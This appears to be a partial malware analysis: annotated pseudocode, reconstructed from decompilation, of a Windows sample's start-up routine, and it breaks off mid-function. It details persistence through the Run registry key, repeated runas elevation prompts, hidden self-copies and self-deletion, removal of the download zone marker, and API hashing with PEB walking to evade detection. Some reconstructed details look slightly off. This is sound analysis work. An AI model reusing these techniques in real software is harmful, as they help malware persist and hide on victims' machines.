// The program starts with a Visual Studio C Runtime Initialisation function _tmainCRTStartup
// https://github.com/cansou/msvcrt/blob/master/src/crt0.c#L169 (Microsoft, 2008) crt0.c from VS Code 2008 is almost identical to ghidra decompilation and assembly
// with Ghidra identifying its functions from Visual Studio 2010
 _tmainCRTStartup:
    GetStartupInfoW((LPSTARTUPINFOW)&startupInfo);
    ...
    lpszCommandLine = (LPSTR)__wwincmdln();
    ...
    mainret = _tWinMain( (HINSTANCE)&__ImageBase,
                        NULL,
                        lpszCommandLine,
                        StartupInfo.dwFlags & STARTF_USESHOWWINDOW
                            ? StartupInfo.wShowWindow
                            : SW_SHOWDEFAULT //0xa
                    );

bool _isAdmin
wchar_t DocumentsPath
wchar_t windowsDir
wchar_t programFiles32
wchar_t cdBurnArea
wchar_t currUsersDesktop
wchar_t AllUsers_desktop
wchar_t ApplicationData
wchar_t Desktop
wchar_t Public_Desktop
wchar_t SelfPath
Wow64DisableWow64FsRedirection* Wow64DisableWow64FsRedirection
Wow64RevertWow64FsRedirection* Wow64RevertWow64FsRedirection
LPOSVERSIONINFOW lpVersionInformation
wchar_t recoverFilePath
wchar_t selfZoneIdentifier
int exeChecksum

//Main function of the malware
//Functions have been moved around for readablity purposes but shouldn't affect the logic
wWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCmd):

    GdiPlusStartup()
    getPngImageEncoder()
 
    //Store Version Information
    _memset(&lpVersionInformation,0,0x11c)
    lpVersionInformation = 0x11c
    GetVersionExW(&lpVersionInformation)

    //Get desktop localisation names from Shell32 
    //https://superuser.com/questions/1226104/list-all-possible-localization-names-in-shell32-dll-or-any-other-dll-with-this (laserflor, 2021)
    shell32Handle = LoadLibraryW(L"Shell32.dll")
    LoadStringW((HINSTANCE)shell32Handle,0x5509,(LPWSTR)&Desktop,0xff)         /*Desktop*/
    LoadStringW((HINSTANCE)shell32Handle,0x5527,(LPWSTR)&Public_Desktop,0xff)  /*Public Desktop*/

    //Find Kernel32 Wow64FsRedirection Functions
    kernel32Handle = GetModuleHandleW(L"KERNEL32")
    Wow64DisableWow64FsRedirection = GetProcAddress(kernel32Handle,"Wow64DisableWow64FsRedirection");
    Wow64RevertWow64FsRedirection = GetProcAddress(kernel32Handle,"Wow64RevertWow64FsRedirection");

    //Store paths as global variables (These are grouped together for readability)
    SHGetFolderPathW(0x0,CSIDL_MYDOCUMENTS /*0x5*/,0x0,0,&DocumentsPath)                   /*USERPROFILE\Documents*/
    SHGetFolderPathW(0x0,CSIDL_WINDOWS /*0x24*/,0x0,0,&windowsDir)                         /*C:\Windows\*/
    SHGetFolderPathW(0x0,CSIDL_PROGRAM_FILES /*0x26*/,0x0,0,&programFiles32)               /*C:\ProgramFiles (x86)*/
    SHGetFolderPathW(0x0,CSIDL_CDBURN_AREA /*0x3b*/,0x0,0,&cdBurnArea)                     /*USERPROFILE\AppData\Local\Microsoft\Windows\Burn\Burn*/
    SHGetFolderPathW(0x0,CSIDL_DESKTOPDIRECTORY /*0x10*/,0x0,0,&currUsersDesktop);         /*USERPROFILE\Desktop*/
    SHGetFolderPathW(0x0,CSIDL_COMMON_DESKTOPDIRECTORY /*0x19*/,0x0,0,&AllUsers_desktop);  /*C:\Users\Public\Desktop*/
    SHGetFolderPathW(0x0,CSIDL_COMMON_APPDATA /*0x23*/,0x0,0,&ApplicationData);            /*C:\ProgramData*/

    //Get a 9 character long string of random lowercase values
    randStr= ""
    getRandStr(&randStr,9)

    //Create path of the "recover_file" in current user's documents
    recoverFilePath = ""
    SHGetSpecialFolderPathW(0x0,&recoverFilePath,CSIDL_MYDOCUMENTS /*0x5*/,0) //Same result as SHGetFolderPathW "USERPROFILE\Documents"
    _wcscat_s(&recoverFilePath,0x1000,L"\\recover_file_")  /*USERPROFILE\Documents\recover_file_*/
    _wcscat_s(&recoverFilePath,0x1000,&randStr)            /*USERPROFILE\Documents\recover_file_randstr*/
    _wcscat_s(&recoverFilePath,0x1000,L".txt")             /*USERPROFILE\Documents\recover_file_randstr.txt*/

    //Find path of current process e.g. %APPDATA%/MSUpdate.exe
    GetModuleFileNameW(0x0,&selfPath,0x1000)

    //Delete the "Zone.Identifier" from the executable that would say whether the file was downloaded from the internet
    //https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/6e3f7352-d11c-4d76-8c39-2516a9df36e8?redirectedfrom=MSDN (Microsoft, 2023)
    _wcscpy_s(&selfZoneIdentifier,0x1000,&selfPath)             /*%APPDATA%/MSUpdate.exe*/
    _wcscat_s(&selfZoneIdentifier,0x1000,L":Zone.Identifier")   /*%APPDATA%/MSUpdate.exe:Zone.Identifier*/
    DeleteFileW(&selfZoneIdentifier)

    //Store the checksum of the executable
    exeChecksum = getExeChecksum()

    //Checks if process is run as administrator and stores value as a global variable
    //https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership (Microsoft, 2021b)

    /*++ 
    Routine Description: This routine returns TRUE if the caller's
    process is a member of the Administrators local group. Caller is NOT
    expected to be impersonating anyone and is expected to be able to
    open its own process and process token. 
    Arguments: None. 
    Return Value: 
    TRUE - Caller has Administrators local group. 
    FALSE - Caller does not have Administrators local group. --
    */ 
    BOOL b;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY /*0x000005*/;
    PSID AdministratorsGroup; 
    b = AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID /*0x20*/,
        DOMAIN_ALIAS_RID_ADMINS /*0x220*/,
        0, 0, 0, 0, 0, 0,
        &AdministratorsGroup); 

    if(b) 
    {
        if (!CheckTokenMembership( NULL, AdministratorsGroup, &b)) 
        {
            b = FALSE;
        } 
        FreeSid(AdministratorsGroup); 
    }
    _isAdmin = b;
     
    //Enable SeDebugPrivilege if allowed
    if (LookupPrivilegeValueA((LPCSTR)0x0,"SeDebugPrivilege",(PLUID)&NTAuthority) != 0):
        enablePrivilege(&NTAuthority);

    //Create a new process with a random name if there is no file of the same name in \Documents or \Windows depending on whether the process is running as admin
    retCode = getSelfIntegrityLevel(&IntegrityLevel)
    if retCode==0:
        retCode= createNewProcess()
        if retCode!= 0: return 1
    else:
        if IntegrityLevel == SECURITY_MANDATORY_MEDIUM_RID /*0x2000*/
            || IntegrityLevel == SECURITY_MANDATORY_HIGH_RID /*0x3000*/
                || IntegrityLevel == SECURITY_MANDATORY_SYSTEM_RID /*0x4000*/:
            retCode = createNewProcess()
            if retCode!=0: return 1

        // Start a new process using the same executable using runas
        // to make the new integrity level >=0x2000
        // then exit
        else if IntegrityLevel < 0x2001:
            runWithCmd()
            return 1
    
    /*Only the new process should be able to get to this section*/

    addToStartup()

    //Create a mutex so only one instance runs at a time
    CreateMutexW = findFunc(0x0,1,0xbf78968a) // Find CreateMutexW using hash 0xbf78968a from kernel32.dll
    CreateMutexW(NULL, FALSE, L"ityeofm9234-23423")
    lastErr = GetLastError()
    if lastErr == ERROR_ALREADY_EXISTS /*0xb7*/:
        return 1
    
    stage2()

//Adds the current process to startup using registry editing
addToStartup():
    windir = ""
    randStr = ""
    getRandStr(&randStr, 12)
    GetEnvironmentVariableW(L"windir",&windir, 0x2000)
    command = ""
    __vsnwprintf(0x2000, &command, L"%s\\system32\\cmd.exe", &windir)
    //Create command to run current process again
    _wcscpy_s(command, 0x104, L"/c start \"\" \"")  /* /c start "" " */
    _wcscat_s(command, 0x104, &selfPath)            /* /c start "" "*selfPath* */
    _wcscpy_s(command, 0x104, L"\"")                /* /c start "" "*selfPath*" */
    RegCreateKeyExW = findFunc(0x0, 2, 0x90a097f0) //find RegCreateKeyExW using hash 0x90a097f0 from dll 'advapi32.dll'

    //Get keyHandle of startup location 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
    RegCreateKeyExW(HKEY_CURRENT_USER /*0x80000001*/,
                        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 
                            REG_OPTION_NON_VOLATILE /*0x00*/, 
                                KEY_WRITE /*0x20006*/ /*READ_CONTROL 0x20000 | KEY_SET_VALUE 0x2 | KEY_CREATE_SUB_KEY 0x4*/, NULL,
                                    &keyHandle, NULL)
    charIndx = 0
    while command[charIndx] != '\x00':
        charIndx+=1
    length = charIndx+1
    
    RegSetValueExW = findFunc(0x0, 2, 0x3e400fc0) //find RegSetValueExW using hash 0x3e400fc0 from dll 'advapi32.dll'
    //Create startup command as shown above with a random string as its name
    RegSetValueExW (keyHandle, &randStr, 0, REG_SZ /*0x1*/, &command, length*2+2)
    RegFlushKey(keyHandle)

    RegCloseKey = findFunc(0x0, 2, 0xdb355534) //find RegCloseKey using hash 0xeb355534 from dll 'advapi32.dll'
    RegCloseKey(keyHandle)

    //Attempt to add/change the value of 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLinkedConnections' to 1
    //https://learn.microsoft.com/en-us/troubleshoot/windows-client/networking/mapped-drives-not-available-from-elevated-command (Microsoft, 2021c)
    //"EnableLinkedConnections registry entry forces the symbolic links to be written to both linked logon sessions that are created, when UAC is enabled."
    //This would allow the program to read from symbolic links if it was in an elevated command prompt
    RegCreateKeyExA(HKEY_LOCAL_MACHINE /*0x80000002*/,
                     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,NULL,
                       REG_OPTION_NON_VOLATILE /*0x00*/, 
                         KEY_WRITE /*0x20006*/ /*READ_CONTROL 0x20000 | KEY_SET_VALUE 0x2 | KEY_CREATE_SUB_KEY 0x4*/, NULL,
                            &phkResult,NULL)
    RegSetValueExW(phkResult,L"EnableLinkedConnections",0, REG_DWORD /*0x4*/,1,4)
    RegFlushKey(phkResult)
    closeKetRet = RegCloseKey(phkResult)
    return closeKetRet

//Start the current process again using the command line, restarting if closed
runWithCmd():
    windir = ""
    windirLen = GetEnvironmentVariableW(L"windir", windir, 0x208)
    cmdPath = ""
    //Store cmd.exe path
    retVal = __vsnwprintf(0x410, cmdPath, L"%s\\system32\\cmd.exe", windir)
    command = ""
    if windirLen != 0 && windirLen < 0x209 && retVal == 0:
        //Create command to run current process again
        _wcscpy_s(command, 0x104, L"/c start \"\" \"")  /* /c start "" " */
        _wcscat_s(command, 0x104, &selfPath)            /* /c start "" "*selfPath* */
        _wcscpy_s(command, 0x104, L"\"")                /* /c start "" "**selfPath" */
        
        SHELLEXECUTEINFOW shellExecuteInfo;
        shellExecuteInfo.lpFile = cmdPath
        shellExecuteInfo.lpParameters = command
        shellExecuteInfo.cbSize = 0x3c
        shellExecuteInfo.lpVerb = L"runas"
        shellExecuteInfo.nShow = SW_HIDE /*0x0*/
        shellExecuteInfo.fMask = SEE_MASK_NOCLOSEPROCESS /*0x40*/
        retVal = ShellExecuteW(&shellExecuteInfo)
        while retVal == 0:
            lastErr = GetLastError()
            if lastErr != ERROR_CANCELLED /*0x4c7*/: goto End
            Sleep(3000)
            retVal = ShellExecuteW(&shellExecuteInfo)
        GetLastError()
        End:
            CloseHandle(shellExecuteInfo.hProcess)
    return 1

// If there is not a file of the same name as the current process in \Documents or \Windows then
// Create a file with a random name in either \Documents or \Windows depending on if running as admin
// Then run the new file as a new process
// And delete the file of the current process
createNewProcess():
    randStr = ""
    getRandStr(randStr, 12)
    windir = ""
    GetEnvironmentVariable(L"windir", &windir, 0x2000)
    
    
    //Find directory where the executable will be copied, 
    //windows directory if running as admin and documents if not
    if _isAdmin == 0:
        exeFolder = &DocumentsPath  /*USERPROFILE\Documents*/
    else:
        exeFolder = &windir         /*C:\Windows*/
    //Get name of current executable
    exeName = PathFindFileNameW(&selfPath)
    exePath = ""
    callvsnwprintf(0x1000,&exePath, L"%s\\%s", exeFolder, exeName) //Concatonate folder and executable name
    fileHandle = CreateFileW(&exePath, GENERIC_READ /*0x80000000*/, FILE_SHARE_READ /*0x1*/, NULL, OPEN_EXISTING /*0x3*/, 0, NULL)
    lastErr = GetLastError()
    CloseHandle(fileHandle)

    //If a file with the same name as the current executable exists
    // in the directory where the file is going to be copied return 0
    if lastErr != ERROR_FILE_NOT_FOUND /*0x2*/:
        return 0
    else:
        //Compute the file path of the new executable to be copied
        //By concatonating the directory, random string and '.exe'
        callvsnwprintf(0x1000,&exePath, L"%s\\%s.exe", exeFolder, randStr)
        createProcRet = 0
        while createProcRet == 0:
            //Copy the current executable into the new path, overwriting any file of the same name
            CopyFileW(&selfPath, &exePath, FALSE)
            //Make new executable hidden
            SetFileAttributesW(&exePath, FILE_ATTRIBUTE_HIDDEN /*0x2*/)
            STARTUPINFO startupInfo;
            PROCESS_INFORMATION processInfo;
            _memset(&startupInfo, 0x00, 0x44)
            startupInfo.wShowWindow = TRUE
            startupInfo.dwFlags = STARTF_USESHOWWINDOW /*0x1*/
            startupInfo.cb = 0x44
            createProcRet = CreateProcessW(NULL, &exePath, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS /*0x20*/, NULL, NULL, &startupInfo, &processInfo)
        
        //Delete the current executable file
        deleteSelf()
        return 1

//Delete the file of the current process
deleteSelf():
    //Find the function GetModuleFileNameW from functionID 0x774393fe from kernel32.dll
    GetModuleFileNameW = findFunc(0x00,1,0x774393fe)
    
    //Get the path of the current process (module)
    selfPath = ""
    retVal = GetModuleFileNameW(0, &selfPath, 0x1000)
    if retVal == 0:
        return 0
    
    //https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file#short-vs-long-names (Microsoft, 2022)
    //Get the MS-DOS compatible short path name 
    retVal = GetShortPathNameW(&selfPath, &selfPath, 0x1000)
    if retVal == 0:
        return 0
    
    //Create command to delete the currentFile
    deleteSelfCmd = ""
    _wcsncpy_s(&deleteSelfCmd, 0x1000, L"/c ", 0x1000)      /*/c */
    _wcsncpy_s(&deleteSelfCmd, 0x1000, L"DE", 0x1000)       /*/c DE*/
    _wcsncpy_s(&deleteSelfCmd, 0x1000, L"L ", 0x1000)       /*/c DEL */
    _wcsncpy_s(&deleteSelfCmd, 0x1000, selfPath, 0x1000)    /*e.g. /c DEL %APPDATA%\MSUpdate.exe*/

    //Find the function GetEnvironmentVariableW from functionID 0x774393fe from kernel32.dll
    GetEnvironmentVariableW = findFunc(0x00,1,0x9802ef26)

    //Find the path of the command line e.g. C:\Windows\System32\cmd.exe
    cmdpath = ""
    retVal = GetEnvironmentVariableW(L"ComSpec", &cmdPath, 0x1000)
    if retVal == 0:
        return 0
    
    //Run the delete self command
    retVal = executeCMDCommand(deleteSelfCmd, cmdPath)
    if 0x20 < retVal:
        return 1
    else:
        return 0

//not actually a seperate function but is used twice with the same logic so I split it out
//Finds the dll base address and/or loads the dll from the dll string
loadDllFromStr(char* dllStr):
    dllLen = 0
    //This counts the length of the dll string as all the dll strings are terminated with the character "\xF2" rather than "\x00"
    while dllStr[dllLen] != "\xF2":
        dllLen+=1
        if dllLen > 0x7f:
            goto loadDll
    
    //Store the dll string with null termination rather than "\xF2"
    if dllLen > 0:
        count = dllLen
        nullTDllStr = ""
        charIndx = 0
        while count!=0:
            count-=1
            nullTDllStr[charIndx] += dllStr[charIndx]
            charIndx+=1
    nullTDllStr[dllLen] = "\x00"

    dllAddr = 0x00

    //Find or load library from strings
    if nullTDllStr[0] != "\x00":
        loadDLL:
            GetModuleHandleA = findFunc(0x00, 1, 0xa48d6762) //GetModuleHandleA's hash is 0xa48d6762
            dllAddr = GetModuleHandleA(dllStr)
            if dllAddr == NULL:
                LoadLibraryA = findFunc(0x00, 1, 0xc8ac8026) //LoadLibraryA's hash is 0xc8ac8026
                dllAddr = LoadLibraryA(dllStr)
    return dllAddr

//Execute command "open *cmdPath* *params*"
executeCMDCommand(char* params, char* cmdPath):
    dllAddr = loadDllFromStr(L"shell32.dll\xF2")
    ShellExecuteW = findFuncFromDllAddr(dllAddr, 0x570bc88f) //ShellExecuteW's hash is 0x570bc88f

    //Run the default command 'open' on the file *cmdPath* with parameters *params*
    //For the command "/c DEL %APPDATA%\MSUpdate.exe" and path "C:\Windows\System32\cmd.exe" it would execute:
        /* open C:\Windows\System32\cmd.exe /c DEL %APPDATA%\MSUpdate.exe */
    //Essentially deleting the file of the current process
    ShellExecuteW(NULL, NULL, cmdPath, params, NULL, FALSE)

//Find function or dll address using function hash or ordinal and dll name or id
findFunc(char* dllName, int dllID, int funcID)
    //Use dllId if dllName is NULL
    if dllName == NULL:
        //Choose dll string from dllID
        switch(dllID):
        case 1:
            //This first case is used as to load the dll from string findFunc needs to be called again resulting in an infinite loop
            dllAddr = findKernel32FromPEB()
            goto findFunc
        case 2:
            dllName = L"advapi32.dll\xF2"
        case 3:
            dllName = L"user32.dll\xF2"
        case 4:
            dllName = L"ws2_32.dll\xF2"
        case 5:
            dllName = L"ntdll.dll\xF2"
        case 6:
            dllName = L"winsta.dll\xF2"
        case 7:
            dllName = L"shell32.dll\xF2"
        case 8:
            dllName = L"wininet.dll\xF2"
        case 9:
            dllName = L"urlmon.dll\xF2"
        case 0xa:
            dllName = L"nspr4.dll\xF2"
        case 0xb:
            dllName = L"ssl3.dll\xF2"
        case 0xc:
            dllName = L"winmm.dll\xF2"
        case 0xd:
            dllName = L"cabinet.dll\xF2"
        case 0xe:
            dllName = L"opera.dll\xF2"
        case 0xf:
            dllName = L"Gdi32.dll\xF2"
        case 0x10:
            dllName = L"gdiplus.dll\xF2"
        case 0x11:
            dllName = L"crypt32.dll\xF2"
        case 0x12:
            dllName = L"SHLWAPI.dll\xF2"
        case 0x13:
            dllName = L"Imagehlp.dll\xF2"
        case 0x14:
            dllName = L"psapi.dll\xF2"
        case 0x15:
            dllName = L"olE32.dll\xF2"
        case 0x16:
            dllName = L"winspool.drv\xF2"
        default:
            return 0
    //Get dllAddress from string
    dllAddr = loadDllFromStr(dllStr)

    //Find function if funcID is non zero
    findFunc:
        if funcID != 0:
            funcAddr = findFuncFromDllAddr(dllAddr, funcID)
            return funcAddr
        else:
            return dllAddr

//Find function address from dll address
findFuncFromDllAddr(void* dllAddr, int funcId):
    //IMAGE_DOS_HEADER+0xc = e_lfanew aka IMAGE_NT_HEADERS offset
    peOffset = [dllAddr->e_lfanew]
    //IMAGE_NT_HEADERS+0x7c is the size of the export table
    ExportSize = [(dllAddr+peOffset)->OptionalHeader.DataDirectory[0].Size]
    OptionalStart = dllAddr+peOffset+0x18
    //IMAGE_OPTIONAL_HEADER+0x60 is the RVA of the export table
    ExportAddr = [optionalStart->DataDirectory[0].VirtualAddress]
    ExportDir = dllAddr + ExportAddr


    //If the funcID is < 4 bytes long use it as the function ordinal
    //This is for forwards that have the function ordinal rather than the function name
    if funcID >> 0x10 == 0:
        //Subtract function ordial from base to get offset ordinal
        //https://ferreirasc.github.io/PE-Export-Address-Table/ (ferreirasc, 2022)
        //IMAGE_EXPORT_DIRECTORY+0x10 = Base
        funcOrdinal = (funcId & 0xffff) - ExportDir->Base
    else:
        //IMAGE_EXPORT_DRIECTORY+0x24 = AddressOfNameOrdinals
        nameOrdAddr = dllAddr + ExportDir->AddressOfNameOrdinals
        //IMAGE_EXPORT_DRIECTORY+0x20 = AddressOfNames
        namesAddr = dllAddr + ExportDir->AddressOfNames

        //Loop through the names until the function with the same hash as input is found or the end of the list is reached
        count = 0
        //IMAGE_EXPORT_DIRECTORY+0x18
        if (ExportDir->NumberOfNames == 0):
            return 0
        while True:
            currName = dllAddr + *namesAddr
            if currName == NULL:
                funcHash = 0xffffffff
            else:
                funcHash = getHash(currName)

            if funcHash == funcId: break

            count+=1
            nameOrdAddr += 0x2
            namesAddr += 0x4
            //IMAGE_EXPORT_DIRECTORY+0x18
            if (count >= ExportDir->NumberOfNames):
                return 0

        funcOrdinal = *nameOrdAddr
    
    if funcOrdinal == 0:
        return 0
    
    //Find the function address
    //IMAGE_EXPORT_DIRECTORY+0x1c
    funcRVA = ExportDir->AddressOfFunctions + funcOrdinal*4
    funcAddr = dllAddr + *(dllAddr + funcRVA)

    //If the function address is within the Export Directory size then it is a forward and must be resolved to find the actual function address
    //https://ferreirasc.github.io/PE-Export-Address-Table/ (ferreirasc, 2022)
    if (ExportDir < funcAddr) && (funcAddr - exportDir < ExportTableSize):
        funcAddr = resolveForwards((funcAddr- exportDir), funcOrdinal, funcAddr)
    return funcAddr

//Find the address of forwarded functions
resolveForwards(int exportOffset, int ordinal, char* forwardName):
    
    if forwardName == NUll:
        return 0

    dllName = ""
    currChar = forwardName[0]
    charIndx = 1
    if currChar == '\x00':
        return 0

    //Find the location of the end of the dll's name (excluding the '.dll')
    while currChar != '.':
        currChar = forwardName[charIndx]
        charIndx +=1
        if currChar == '\x00':
            return 0

    //Copy just the dll name into *dllname*
    remainingChars = charIndx
    charIndx2 = 0
    while remainingChars != 0:
        remainingChars-=1
        dllName[charIndx2] = forwardName[charIndx2]
        charIndx2+=1
    
    //Add back the '.dll' to the dll name with null termination
    dllExt = ".dll"
    charIndx3 = 0
    currChar = dllExt[charIndx3]
    while currChar != "\x00":
        currChar = dllExt[charIndx3]
        dllName+=currChar
        charIndx3+=1
    
    //If the forwared function name starts with '#' then store integer value of the function ordinal rather than the function hash
    //https://reverseengineering.stackexchange.com/a/16024 (Porst, 1999)
    //http://www.pelib.com/resources/luevel.txt (Porst, 1999)
    if forwardName[charIndx+1] == "#":
        funcID = stringToInt(&forwardName[charIndx+2])
    else:
        funcID = getHash(dllName)
    
    //Find forward from the dll name and function ID
    funcAddr = fundFunc(dllName, 0, funcID)
    return funcAddr

//Convert string to integer
stringToInt(char* intStr):
    if intStr == NULL:
        return 0
    
    //Skip all ' ' characters
    currChar = intStr[0]
    currIndx = 0
    while currChar == ' ':
        currIndx += 1
        currChar = intStr[currIndx]
    
    signVal = intStr[currIndx]

    //Skip '-' & '+'
    numberIndx = currIndx + 1
    if signVal == '-' || signVal == '+':
        currChar = intStr[currIndx]
        numberIndx = currIndx + 1
    
    //Find the integer value of the ascii number (ascii value - 0x30 = integer value)
    intVal = 0
    while intStr[numberIndx] - 0x30 < 10:
        intVal = (intStr[numberIndx] - 0x30) + intVal * 10 // intVal * 10 is moving the indices
        numberIndx += 1
    
    //Make the number negative if it starts with a minus
    if signVal == '-':
        numberIndx = -numberIndx
    return numberIndx

//not actually a seperate function but is used twice with the same logic so I split it out
//Returns hashed value of entered string
getHash(char* str):
    encOut = 0
    charIndx = 0
    while str[charIndx] != "\x00":
        encOut = (encOut << 7 | encOut >> 0x19) ^ str[charIndx]
        charIndx+=1
    return encOut

//Returns the base address of kernel32.dll by traversing the PEB LDR data table
findKernel32FromPEB():
    //Get the address of the LDR_DATA_TABLE from 
        /* (fs) +0x30     +0xc   */
        // TEB   ->  PEB   ->  Ldr
    LDRData = [fs[0x30]+0xc]
    //LDRData+0xc
    nextFlink = LDRData->InLoadOrderModuleList.Flink
    while nextFlink != &LDRData->InLoadOrderModuleList:
        nameStore = ""
        
        //Calculate length of name in characters at a maximum of 103 characters
        //NextFlink+0x2c
        nameLen = NextFlink->BaseDllName.Length
        if (nameLen & 0xfffe) < 0x207:
            halfLen = nameLen >> 1
        else:
            halfLen = 0x103
        
        //Store the dll into *nameStore*
        //NextFlink+0x30
        nameBuff = NextFlink->BaseDllName.Buffer
        charIndx = 0
        if nameBuff != NULL && halfLen != 0:
            while charIndx < halfLen:
                nameStore[charIndx] = nameBuff[charIndx]
        
        //Convert the name to lower case
        halfLen2 = len(nameStore)
        charIndx = 0
        while charIndx <= halfLen2:
            currChar = nameStore[charIndx]
            if (currChar => 'A' /*0x40*/) && (currChar <= 'Z' /*0x5b*/):
                nameStore[charIndx] = currChar + 0x20 //Make upper case characters lower case
            charIndx+=1


        //If kernel32.dll found then return its base address
        if nameStore != NULL :
            dllHash = getHash(nameStore)
            if dllHash = 0x4b1ffe8e: //"kernel32.dll"'s hash is 0x4b1ffe8e
                //NextFlink+0x18
                return NextFlink->DllBase
        else:
            NextFlink = NextFlink->InLoadOrderLinks.Flink
    return 0

//Find the manditory integrity level of the current process and store it in the provided callback address
getSelfIntegrityLevel(DWORD *cb):
    if cb == 0:
        SetLastError(0x57)
        return 0
    errVal = 0

    TokenHandle = 0
    DesiredAccess = TOKEN_QUERY /*0x8*/
    ProcessHandle = GetCurrentProcess()
    retVal = OpenProcessToken(ProcessHandle, DesiredAccess, &TokenHandle)
    if retVal ==0:
        errVal = GetLastError()
        goto End

    //Get the length of the TokenIntegrityLevel return value and store in *ReturnLen*
    ReturnLen = 0
    retVal = GetTokenInformation(TokenHandle, TokenIntegrityLevel /*0x19*/, NULL, 0, &ReturnLen)
    if (retVal == 0 && GetLastError() != ERROR_INSUFFICIENT_BUFFER /*0x7a*/): //It expects to get ERROR_INSUFFICIENT_BUFFER as the TokenInformationLength is 0
        errVal = GetLastError()
        goto End

    //Allocate variable with found return length
    TokenInformation = LocalAlloc(LMEM_ZEROINIT /*0x40*/, ReturnLen);
    if TokenInformation == 0:
        errVal = GetLastError()
        goto End
    
    //Store TOKEN_MANDATORY_LABEL structure into *TokenInformation*
    retVal = GetTokenInformation(TokenHandle, TokenIntegrityLevel /*0x19*/, &TokenInformation, ReturnLen, &ReturnLen)
    if retVal == 0:
        errVal = GetLastError()
        goto End
    
    //Store the TOKEN_MANDATORY_LABEL.Sid->SubAuthority (aka the manditory integrity level value) from *TokenIntegrityLevel* in the callback address
    *cb = GetSidSubAuthority(TokenInformation, 0)

    End:
    if TokenHandle != 0:
        CloseHandle(TokenHandle)
        TokenHandle = 0
    if TokenInformation != NULL:
        LocalFree(TokenInformation)
        ReturnLen = 0
    if errVal == 0:
        return 1
    else:
        SetLastError(errVal)
        return 0

//Enables provided privilege for current process
enablePrivilege(LUID * IdentifierAuthority):
    TokenHandle=0
    /*0x20028*/
    DesiredAccess = READ_CONTROL /*0x20000*/ | TOKEN_ADJUST_PRIVILEGES /*0x20*/ | TOKEN_QUERY /*0x8*/
    ProcessHandle = GetCurrentProcess()
    retVal = OpenProcessToken(ProcessHandle, DesiredAccess, &TokenHandle)
    if retVal ==0:
        return 0

    _TOKEN_PRIVILEGES NewState;
    NewState.Privileges[0].Luid = IdentifierAuthority
    NewState.PrivilegeCount = 1
    NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED /*0x2*/
    AdjustTokenPrivileges(TokenHandle, FALSE, &NewState, NULL, NULL, NULL)
    CloseHandle(TokenHandle)
    return 1

//Get the value of IMAGE_NT_HEADERS.OptionalHeader.CheckSum using IMAGE_DOS_HEADER address in global *selfPath*
getExeChecksum():
    peOffset = 0
    selfHandle = CreateFileW(&selfPath,GENERIC_READ /*0x80000000*/,FILE_SHARE_READ /*0x1*/, 0x0,OPEN_EXISTING /*0x3*/,0,0x0)
    if (selfHandle != INVALID_HANDLE_VALUE /*-0x1*/):
        SetFilePointer(selfHandle,0x3c,0x0,0);             //Move to IMAGE_DOS_HEADER.e_lfanew
        ReadFile(selfHandle,&peOffset,2,&totalRead,0x0);   //Read e_lfanew
        SetFilePointer(selfHandle,peOffset + 0x58,0x0,0);  //Move to IMAGE_NT_HEADERS.OptionalHeader.CheckSum
        ReadFile(selfHandle,&checksum,4,&totalRead,0x0);   //Read checksum
        CloseHandle(selfHandle);
        return (short)checksum;
    
    return 0;


//Get a *length* long string of random lowercase values
getRandStr(wchar_t* dst, int length);
    if length<1:
        [dst+length*2] = ""
        return

    for count in range(length):
        setSeed(GetTickCount())
        randVal=0
        while randVal % 'z' /*0x7a*/ < 'a' /*0x61*/:
            randVal = getRand()
        setSeed(1)

        [dst+count*2] = randVal % 'z' /*0x7a*/
        Sleep(15)

    [dst+length*2] = '\0'
    return

//There wasn't enough time to reverse the rest so here is a partial reversing of the rest
stage2():
    _memset(0x43fd58,0 , 0x15c)

    retVal = doSomeRegediting()


BYTE xxxsysID
wchar_t xxxsysID_Str
void* funcAddrsPtr
funcAddrs = [call0x1c180, callGenRandom, resetVars, func0x1c180]
doSomeRegediting():
    keyHandle = 0
    //This will return ERROR_BAD_PATHNAME *0xA1 (161)* if not windows 95/98:
    //https://asmsource1.tripod.com/proccalls/proc-RegCreateKeyEx.htm (Microsoft, 2005)
    //Windows NT/2000: The subkey name specified by lpSubKey must not begin with the backslash character ('\'). If it does, ERROR_BAD_PATHNAME is returned.
    //Windows 95/98: Beginning backslash characters in the subkey name specified by lpSubKey are ignored.
    retVal = RegCreateKeyExW(HKEY_USERS /*0x80000003*/, L"\\S-1-5-18\\Software\\xxxsys\\", 0, NULL,
                                REG_OPTION_NON_VOLATILE /*0x00*/, 
                                    KEY_READ /*0x20019*/ /*READ_CONTROL 0x20000 | KEY_NOTIFY 0x10 | KEY_ENUMERATE_SUB_KEYS 0x8 | KEY_QUERY_VALUE 0x1*/, NULL
                                        &keyHandle, NULL)
    
    //Most likely never called
    if retVal == ERROR_SUCCESS /*0x00*/:
        type = 0
        size = 0
        retVal = RegQueryValueExW(keyHandle, L"ID", NULL, &type, &xxxsysID, &size)
        if retVal = ERROR_SUCCESS /*0x00*/:
            xxxsysID_StrHigh = ""
            call_vsnwprintf(&xxxsysID_Str, 0x18, L"%X%X%X%X", xxxsysID[0], xxxsysID[1], xxxsysID[2], xxxsysID[3]) //Store string value of low bits into global *xxxsysID_Str*
            call_vsnwprintf(&xxxsysID_StrHigh, 0x18, L"%X%X%X%X", xxxsysID[4], xxxsysID[5], xxxsysID[6], xxxsysID[7]) // store string value of high bits into *xxxsysID_StrHigh*
            _wcscat_s(&xxxsysID_Str, 0x18, &xxxsysID_StrHigh) //Concatonate low and high parts of the xxxsys ID to get the full string value of the ID
            RegCloseKey(keyHandle)
            return 1
    
    //HKEY_CURRENT_USER\Software\xxxsys\
    RegCreateKeyExW(HKEY_CURRENT_USER /*0x80000001*/, L"Software\\xxxsys\\", 0, NULL,
